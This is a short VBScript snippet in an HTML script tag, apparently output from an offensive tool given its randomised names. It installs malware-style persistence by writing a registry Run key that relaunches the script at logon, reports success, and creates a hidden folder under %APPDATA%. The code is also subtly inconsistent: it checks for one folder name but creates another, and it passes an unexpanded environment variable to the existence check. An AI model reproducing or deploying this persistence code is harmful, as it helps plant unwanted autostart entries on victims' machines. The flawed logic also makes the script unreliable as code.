<script language="VBSCRIPT">
	Dim var_IOxQd, var_iJyU
	Set var_IOxQd = CreateObject("WScript.Shell")
	var_iJyU = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SuQmasZz"
	var_IOxQd.RegWrite var_iJyU, "wscript.exe " & WScript.ScriptFullName, "REG_SZ"
	WScript.Echo "Persistence installed at " & var_iJyU
	Dim var_YdLUpo
	Set var_YdLUpo = CreateObject("Scripting.FileSystemObject")
	If Not var_YdLUpo.FolderExists("%APPDATA%\\YmYorw") Then
		var_YdLUpo.CreateFolder(var_IOxQd.ExpandEnvironmentStrings("%APPDATA%\\UigaqL"))
	End If
</script>
